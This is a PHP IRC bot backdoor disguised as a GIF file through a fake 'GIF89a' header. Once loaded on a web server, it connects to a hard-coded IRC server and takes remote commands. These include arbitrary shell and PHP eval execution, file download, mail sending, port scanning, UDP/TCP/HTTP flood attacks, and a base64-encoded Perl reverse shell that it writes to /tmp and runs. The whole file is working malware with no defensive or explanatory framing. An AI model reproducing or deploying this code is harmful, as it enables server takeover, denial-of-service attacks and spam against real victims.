GIF89aGiEyE
<?php
set_time_limit(0);
error_reporting(0);
echo "<title>Network Error</title>";
ini_set("max_execution_time",0);
class mtw
{
var $config = array("server"=>"64.32.28.3",
                     "port"=>"443",
                     "pass"=>" ",
                     "prefix"=>"mTw",
                     "maxrand"=>"3",
                     "chan"=>"#yuki",
                     "key"=>"",
                     "modes"=>"+p",
                     "password"=>"secure",
                     "trigger"=>".",
                     "hostauth"=>"*"
                     );
var $users = array();
function start()
{
    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))
    $this->start();
    $ident = $this->config['prefix'];
    for($i=0;$i<$this->config['maxrand'];$i++)
    $ident .= chr((mt_rand(0, 1) ? 97 : 65) + mt_rand(0, 25));
    if(strlen($this->config['pass'])>0)
    $this->send("PASS ".$this->config['pass']);
    $this->send("USER ".$ident." 127.0.0.1 localhost :d0sc0d3r - FlYinG iN ThE SkY");
    $this->set_nick();
    $this->main();
}
function main()
{
    while(!feof($this->conn))
    {
       $this->buf = trim(fgets($this->conn,512));
       $cmd = explode(" ",$this->buf);
       if(substr($this->buf,0,6)=="PING :")
       {
          $this->send("PONG :".substr($this->buf,6));
       }
       if(isset($cmd[1]) && $cmd[1] =="001")
       {
          $this->send("MODE ".$this->nick." ".$this->config['modes']);
          $this->join($this->config['chan'],$this->config['key']);
          if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "ON"; }
          else { $safemode = "OFF"; }
          $uname = php_uname();
       }
       if(isset($cmd[1]) && $cmd[1]=="433")
       {
          $this->set_nick(); 
       }
       if($this->buf != $old_buf)
       {
          $mcmd = array();
          $msg = substr(strstr($this->buf," :"),2);
          $msgcmd = explode(" ",$msg);
          $nick = explode("!",$cmd[0]);
          $vhost = explode("@",$nick[1]);
          $vhost = $vhost[1];
          $nick = substr($nick[0],1);
          $host = $cmd[0];
          if($msgcmd[0]==$this->nick)
          {
           for($i=0;$i<count($msgcmd);$i++)
              $mcmd[$i] = $msgcmd[$i+1];
          }
          else
          {
           for($i=0;$i<count($msgcmd);$i++)
              $mcmd[$i] = $msgcmd[$i];
          }
          if(count($cmd)>2)
          {
             switch($cmd[1])
             {
                case "QUIT":
                   if($this->is_logged_in($host))
                   {
                      $this->log_out($host);
                   }
                break;
                case "PART":
                   if($this->is_logged_in($host))
                   {
                      $this->log_out($host);
                   }
                break;
                case "PRIVMSG":
                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*"))
                   {
                      if(substr($mcmd[0],0,1)==$this->config['trigger'])
                      {
                         switch(substr($mcmd[0],1))
                         {
                            case "user":
                              if($mcmd[1]==$this->config['password'])
                              {
                                 $this->log_in($host);
                              }
                              else
                              {
                                 $this->notice($this->config['chan'],"[\2Auth\2]: Incorrect password from $nick");
                              }
                            break;
                         }
                      }
                   }
                   elseif($this->is_logged_in($host))
                   {
                      if(substr($mcmd[0],0,1)==$this->config['trigger'])
                      {
                         switch(substr($mcmd[0],1))
                         {
                            case "restart":
                               $this->send("QUIT :Comback...");
                               fclose($this->conn);
                               $this->start();
                            break;
                            case "mail": //mail to from subject message
                               if(count($mcmd)>4)
                               {
                                  $header = "From: <".$mcmd[2].">";
                                  if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header))
                                  {
                                     $this->privmsg($this->config['chan'],"[\2mail\2]: Unable to send email.");
                                  }
                                  else
                                  {
                                     $this->privmsg($this->config['chan'],"[\2mail\2]: Message sent to \2".$mcmd[1]."\2");
                                  }
                               }
                            break;
                            case "df":
                               $df="ini_get disable!";
                               if((@function_exists('ini_get')) && (''==($df=@ini_get('disable_functions'))))
                               {
                                $df = "NONE";
                                }
								else {
                                $df = "$df";
                                }
                               $this->privmsg($this->config['chan'],"[\2Disable Function\2]: ".$df."");
                            break;
                            case "safe":
                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
                               {
                               $safemode = "ON";
                               }
                               else {
                               $safemode = "OFF";
                               }
                               $this->privmsg($this->config['chan'],"[\2safe mode\2]: ".$safemode."");
                            break;
                            case "inbox": //teste inbox
                               if(isset($mcmd[1]))
                               {
                                  $token = md5(uniqid(rand(), true));
                                  $header = "From: <inbox".$token."@doscoder.org>";
                                  $a = php_uname();
                                  $b = getenv("SERVER_SOFTWARE");
                                  $c = gethostbyname($_SERVER["HTTP_HOST"]);
                                  if(!mail($mcmd[1],"InBox Test","doscoder. since 2007\n\nip: $c \nsoftware: $b \nsystem: $a \nvuln: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\n\ngreetz: wicked\nby: dvl <admin@doscoder.org>",$header))
                                  {
                                     $this->privmsg($this->config['chan'],"[\2inbox\2]: Unable to send");
                                  }
                                  else
                                  {
                                     $this->privmsg($this->config['chan'],"[\2inbox\2]: Message sent to \2".$mcmd[1]."\2");
                                  }
                               }
                            break;
                            case "conback":
                               if(count($mcmd)>2)
                               {
                                  $this->conback($mcmd[1],$mcmd[2]);
                               }
                            break;
                            case "dns":
                               if(isset($mcmd[1]))
                               {
                                  $ip = explode(".",$mcmd[1]);
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))
                                  {
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
                                  }
                                  else
                                  {
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
                                  }
                               }
                            break;
                            case "info":
                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "ON"; }
                               else { $safemode = "OFF"; }
                               $uname = php_uname();
                               $this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
                               $this->privmsg($this->config['chan'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
                            break;
                            case "ownz":
                               $this->privmsg($this->config['chan'],"[\2bot\2]: 9,1 -=- RoBot by doscoder ©  Security Team -=- 9,1");
                            break;
                            case "uname":
                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "ON"; }
                               else { $safemode = "OFF"; }
                               $uname = php_uname();
                               $this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
                            break;
                            case "rndnick":
                               $this->set_nick();
                            break;
                            case "raw":
                               $this->send(strstr($msg,$mcmd[1]));
                            break;
                            case "eval":
                              $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
                            break;
                            case "sexec":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $exec = shell_exec($command);
                               $ret = explode("\n",$exec);
                               for($i=0;$i<count($ret);$i++)
                                  if($ret[$i]!=NULL)
                                     $this->privmsg($this->config['chan'],"[\2sexec\2]: ".trim($ret[$i]));
                            break;
                            case "exec":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $exec = exec($command);
                               $ret = explode("\n",$exec);
                               for($i=0;$i<count($ret);$i++)
                                  if($ret[$i]!=NULL)
                                     $this->privmsg($this->config['chan'],"[\2exec\2]: ".trim($ret[$i]));
                            break;
                            case "passthru":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $exec = passthru($command);
                               $ret = explode("\n",$exec);
                               for($i=0;$i<count($ret);$i++)
                                  if($ret[$i]!=NULL)
                                     $this->privmsg($this->config['chan'],"[\2passthru\2]: ".trim($ret[$i]));
                            break;
                            case "popen":
                               if(isset($mcmd[1]))
                               {
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                                  $this->privmsg($this->config['chan'],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r");
                                  while(!feof($pipe))
                                  {
                                     $pbuf = trim(fgets($pipe,512));
                                     if($pbuf != NULL)
                                        $this->privmsg($this->config['chan'],"[\2popen\2]: $pbuf");
                                  }
                                  pclose($pipe);
                               }  
                            case "system":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $exec = system($command);
                               $ret = explode("\n",$exec);
                               for($i=0;$i<count($ret);$i++)
                                  if($ret[$i]!=NULL)
                                     $this->privmsg($this->config['chan'],"[\2system\2]: ".trim($ret[$i]));
                            break;
                            case "pscan": // .pscan 127.0.0.1 6667
                               if(count($mcmd) > 2)
                               {
                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2");
                                  else
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2");
                               }
                            break;
                            case "ch.server": // .ud.server <server> <port> [password]
                               if(count($mcmd)>2)
                               {
                                  $this->config['server'] = $mcmd[1];
                                  $this->config['port'] = $mcmd[2];
                                  if(isset($mcmcd[3]))
                                  {
                                   $this->config['pass'] = $mcmd[3];
                                   $this->privmsg($this->config['chan'],"[\2update\2]: Changed server to ".$mcmd[1].":".$mcmd[2]." Senha: ".$mcmd[3]);
                                  }
                                  else
                                  {
                                     $this->privmsg($this->config['chan'],"[\2update\2]: Changed server to ".$mcmd[1].":".$mcmd[2]);
                                  }
                               }
                            break;
                            case "dl":
                               if(count($mcmd) > 2)
                               {
                                  if(!$fp = fopen($mcmd[2],"w"))
                                  {
                                     $this->privmsg($this->config['chan'],"[\2download\2]: Cannot download, permission denied.");
                                  }
                                  else
                                  {
                                     if(!$get = file($mcmd[1]))
                                     {
                                        $this->privmsg($this->config['chan'],"[\2download\2]: Unable to download from \2".$mcmd[1]."\2");
                                     }
                                     else
                                     {
                                        for($i=0;$i<=count($get);$i++)
                                        {
                                           fwrite($fp,$get[$i]);
                                        }
                                        $this->privmsg($this->config['chan'],"[\2download\2]: File \2".$mcmd[1]."\2 download to \2".$mcmd[2]."\2");
                                     }
                                     fclose($fp);
                                  }
                               }
                               else { $this->privmsg($this->config['chan'],"[\2download\2]: Usage: .download http://your.host/file /tmp/file"); }
                            break;
                            case "base64":
                            {
                               $str_ed = substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])+1);
                               switch($mcmd[1])
                               {
                                  case "encode":
                                  {
                                     $this->privmsg($this->config['chan'],"[\2base64\2] Encode ['".$str_ed."' => '".base64_encode($str_ed)."']");
                                     break;
                                  }
                                  case "decode":
                                  {
                                     $this->privmsg($this->config['chan'],"[\2base64\2] Decode ['".$str_ed."' => '".base64_decode($str_ed)."']");
                                     break;
                                  }
                               }
                               break;
                            }
                            case "md5":
                            {
                               $str_md5 = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
                               $this->privmsg($this->config['chan'],"[\2md5\2] ['".$str_md5."' => '".md5($str_md5)."']");
                               break;
                            }
                            case "die":
                               $this->send("QUIT :See Ya!!!");
                               fclose($this->conn);
                               exit;
                            case "logout":
                               $this->log_out($host);
                               $this->privmsg($this->config['chan'],"[\2auth\2]: $nick logged out!");
                            break;
                            case "uf":
                               if(count($mcmd)>3)
                               {
                                  $this->uf($mcmd[1],$mcmd[2],$mcmd[3]);
                               }
                            break;
                            case "hf":
                               {
                                  $this->hf($mcmd[1],$mcmd[2],$mcmd[3]);
							break;
                               }
                            case "urlf":
                               {
                                  $this->urlf($mcmd[1],$mcmd[2],$mcmd[3]);
                            break;
                               }							   
                            case "tf":
                               if(count($mcmd)>5)
                               {
                                  $this->tf($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]);
                               }
                            break;
                         }
                      }
                   }
                break;
             }
          }
       }
       $old_buf = $this->buf;
    }
    $this->start();
}
function send($msg)
{
    fwrite($this->conn,"$msg\r\n");

}
function join($chan,$key=NULL)
{
    $this->send("JOIN $chan $key");
}
function privmsg($to,$msg)
{
    $this->send("PRIVMSG $to :$msg");
}
function notice($to,$msg)
{
    $this->send("NOTICE $to :$msg");
}
function is_logged_in($host)
{
    if(isset($this->users[$host]))
       return 1;
    else
       return 0;
}
function log_in($host)
{
    $this->users[$host] = true;
}
function log_out($host)
{
    unset($this->users[$host]);
}
function set_nick()
{
    if(isset($_SERVER['SERVER_SOFTWARE']))
    {
       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"apache"))
          $this->nick = "A";
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"iis"))
          $this->nick = "I";
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"xitami"))
          $this->nick = "X";
       else
          $this->nick = "U";
    }
    else
    {
       $this->nick = "C";
    }
    $this->nick .= $this->config['prefix'];
    for($i=0;$i<$this->config['maxrand'];$i++)
       $this->nick .= mt_rand(0,9);
    $this->send("NICK ".$this->nick);
}
  function uf($host,$packetsize,$time) {
    $this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2 - $host with \2$packetsize\2 Packets for \2$time\2 Seconds]");
    $packet = "";
    for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,512)); }
    $timei = time();
    $i = 0;
    while(time()-$timei < $time) {
        $fp=fsockopen("udp://".$host,mt_rand(1,65532),$e,$s,5);
          fwrite($fp,$packet);
           fclose($fp);
        $i++;
    }
    $env = $i * $packetsize;
    $env = $env / 1048576; #1MB is 1,024 kilobytes, or 1,048,576 (1024x1024) bytes
    $vel = $env / $time;
    $vel = round($vel);
    $env = round($env);
    $this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: - [ Total: \2$env\2 MB Sent - Speed: \2$vel\2 MB/sec]");
}
function hf( $host, $port, $times, $mode = 0 )
{
$buaz = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20140305 Firefox/24.0 PaleMoon/24.4.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0 CometBird/11.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:24.0) Gecko/20140329 Firefox/24.0 PaleMoon/24.4.2",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1");
$bua = $buaz[rand(0,(count($buaz)-1))];
if( !isset( $host ) || !isset( $port ) || !isset( $times ) )
   return;
         $this->privmsg($this->config['chan'],"[\2HttpFlood Started!\2]");
         $success = 0;
         for( $i = 0; $i < $times; $i++ )
         {
            $fp = fsockopen( $host, $port, $errno, $errstr, 30 );
            if( $fp )
            {
               $request = "GET / HTTP/1.1\r\n";
               $request .= "Accept: */*\r\n";
               $request .= "Accept-Language: en\r\n";
               $request .= "Accept-Encoding: gzip, deflate\r\n";
               $request .= "User-Agent: ".$bua."\r\n";
               $request .= "Host: ".$host."\r\n";
               $request .= "Keep-Alive: 300\r\n";
               $request .= "Connection: Keep-Alive\r\n\r\n";
               fwrite( $fp, $request );

               if( $mode != 0 )
               {
                  while(!feof($fp)){/*do nothing*/}
               }

               fclose( $fp );

               $success++;
            }
         }
         $this->privmsg($this->config['chan'],"[\2HttpFlood Finished!\2]: - [ http://$host:$port ] [ Total: \2".$success."\2 Times Visited.]");
}
function urlf( $host, $path, $times, $mode = 0 )
{
$buaz = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20140305 Firefox/24.0 PaleMoon/24.4.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0 CometBird/11.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:24.0) Gecko/20140329 Firefox/24.0 PaleMoon/24.4.2",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1");
$bua = $buaz[rand(0,(count($buaz)-1))];
         if( !isset( $host ) || !isset( $path ) || !isset( $times ) )
            return;
         $this->privmsg( $this->config['chan'],"[\2UrlFlood Started!\2]");
         $success = 0;
         for( $i = 0; $i < $times; $i++ )
         {
            $fp = fsockopen( $host, 80, $errno, $errstr, 30 );
            if( $fp )
            {
               $out = "GET /".$path." HTTP/1.1\r\n";
               $out .= "Accept: */*\r\n";
               $out .= "Accept-Language: en\r\n";
               $out .= "Accept-Encoding: gzip, deflate\r\n";
               $out .= "User-Agent: ".$bua."\r\n";
               $out .= "Host: ".$host."\r\n";
               $out .= "Keep-Alive: 300\r\n";
               $out .= "Connection: Keep-Alive\r\n\r\n";
               fwrite( $fp, $out );

               if( $mode != 0 )
               {
                  while(!feof($fp)){/*do nothing*/}
               }

               fclose( $fp );

               $success++;
            }
         }
         $this->privmsg( $this->config['chan'],"[\2UrlFlood Finished!\2]: - [http://".$host."/".$path." ] [ Total: \2".$success." \2 Times Visited.]");
}
function tf($host,$packets,$packetsize,$port,$delay)
{
    $this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]");
    $packet = "";
    for($i=0;$i<$packetsize;$i++){
       $packet .= chr(mt_rand(1,512));}
    for($i=0;$i<$packets;$i++)
    {
       if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5))
       {
          $this->privmsg($this->config['chan'],"[\2TcpFlood\2]: Error: <$e>");
          return 0;
       }
       else
       {
          fwrite($fp,$packet);
          fclose($fp);
       }
       sleep($delay);
    }
    $this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: - [ Total: \2$packets\2 packets to $host:$port]");
}
function conback($ip,$port)
{
    $this->privmsg($this->config['chan'],"[\2conback\2]: Connection attempt to $ip:$port");
    $dc_source = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==";
    if (is_writable("/tmp"))
    {
      if (file_exists("/tmp/dc.pl")) { unlink("/tmp/dc.pl"); }
      $fp=fopen("/tmp/dc.pl","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl /tmp/dc.pl $ip $port &");
      unlink("/tmp/dc.pl");
    }
    else
    {
    if (is_writable("/var/tmp"))
    {
      if (file_exists("/var/tmp/dc.pl")) { unlink("/var/tmp/dc.pl"); }
      $fp=fopen("/var/tmp/dc.pl","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl /var/tmp/dc.pl $ip $port &");
      unlink("/var/tmp/dc.pl");
    }
    if (is_writable("."))
    {
      if (file_exists("dc.pl")) { unlink("dc.pl"); }
      $fp=fopen("dc.pl","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl dc.pl $ip $port &");
      unlink("dc.pl");
    }
    }
  }
}
$mtw = new mtw;
$mtw->start();
?>